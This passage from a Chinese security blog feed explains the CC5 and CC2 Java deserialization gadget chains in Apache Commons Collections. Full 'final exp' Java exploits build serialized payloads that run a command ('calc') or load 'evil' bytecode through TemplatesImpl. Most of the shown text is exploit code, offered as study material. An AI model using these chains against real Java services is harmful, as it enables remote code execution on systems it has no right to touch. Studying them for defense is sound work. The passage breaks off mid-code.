punctuation">;</span>        <span class="token class-name">Map</span> decorateMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tiedMapEntry<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="BadAttributeValueExpException入口类部分"><a href="#BadAttributeValueExpException入口类部分" class="headerlink" title="BadAttributeValueExpException入口类部分"></a>BadAttributeValueExpException入口类部分</h2><p>入口类的 <code>BadAttributeValueExpException</code> 的作用域是 public，所以我们可以直接 new 一个对象</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后修改 <code>BadAttributeValueExpException</code> 的 val 值，而 <code>BadAttributeValueExpException</code> 是支持序列化的，直接用反射的方式来修改</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> <span class="token string">"val"</span><span class="token punctuation">,</span> tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc5</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> <span class="token string">"val"</span><span class="token punctuation">,</span> tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/09/06/CC5%E9%93%BE/image-20240906112432015.png" alt="image-20240906112432015"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;CC5，说白了就是在CC6的基础上换了个入口类&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/&quot;&gt;https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CC2链</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/05/CC2%E9%93%BE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/05/CC2%E9%93%BE/</id>
    <published>2024-09-05T03:07:31.000Z</published>
    <updated>2024-09-05T09:02:26.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CC2 这条链实际上是在 CC4 链基础上的修改，目的是为了避免使用 <code>Transformer</code> 数组</p><p>参考：</p><p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/</a></p><p>《Java安全漫谈》</p><span id="more"></span><hr><h1 id="构造不含数组的反序列化Gadget"><a href="#构造不含数组的反序列化Gadget" class="headerlink" title="构造不含数组的反序列化Gadget"></a>构造不含数组的反序列化Gadget</h1><p>这里有两种方法可以解决这个问题：</p><ul><li><p>一种方法是JRMP，需要外连服务器，参考<a href="https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/">https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/</a></p></li><li><p>还有一种方法是之前用过的<code>TemplatesImpl</code>，我们在前面 cc1&#x2F;cc6 + TemplatesImpl 的时候利用<code>InvokerTransformer</code>调用<code>TemplatesImpl#newTransformer</code> 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不过这里依旧是用到了Transformer数组，因此我们还得做一些修改</p></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>回去再看一下cc2的链子流程图：</p><p><img src="/blog/2024/09/05/CC2%E9%93%BE/image-20240905162519773.png" alt="image-20240905162519773"></p><p>在 CC4 链的基础上，抛弃了用 <code>InstantiateTransformer</code> 类将 <code>TrAXFilter</code> 初始化，以及 <code>TemplatesImpl.newTransformer()</code> 这个步骤，但是前半部分的 compare 还是和 cc4 一样，而且最后命令执行的方式也是走 TemplatesImpl 执行动态字节码，难点就在于 InvokerTransform 的连接</p><h2 id="写exp"><a href="#写exp" class="headerlink" title="写exp"></a>写exp</h2><p>先把 cc4 的copy过来，然后尝试用 <code>InvokerTransform</code> 连接链子</p><p><code>TemplatesImpl</code>加载字节码的部分不用动</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后依旧是构造 InvokerTransformer 类去调用<code>TemplatesImpl#newTransformer</code>方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里也创建个不用数组的 TransformingComparator 类对象 fakeTransformer，传⼊一个临时的  Transformer 类对象，让命令执行只在反序列化的时候执行</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TransformingComparator</span> fakeTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对照一下原先的代码，如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> obj <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来创建 PriorityQueue 类对象 传入 <code>transformingComparator</code> 对象，但是此时向队列里添加的元素就是我们前面创建的 <code>TemplatesImpl</code> 对象 obj 了<del>（简单来说就是我们的obj还没用呢）</del></p><p>这是因为最后调用 <code>PriorityQueue.compare()</code> 的时候是传入队列中的两个对象，然后 <code>compare()</code> 中调用 <code>Transformer.transform(obj1)</code> 的时候用的是传入的第一个对象作为参数，因此这里需要将 priorityQueue 队列中的第一个对象设置为构造好的 obj 对象，这里贪方便就两个都设置为 obj 了</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>fakeTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后通过反射把 fakeTransformer 的 transformer.iMethodName 值再改成 invokerTransformer 的 newTransformer</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>fakeTransformer<span class="token punctuation">,</span> <span class="token string">"transformer"</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc2</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span> fakeTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>fakeTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>fakeTransformer<span class="token punctuation">,</span> <span class="token string">"transformer"</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span 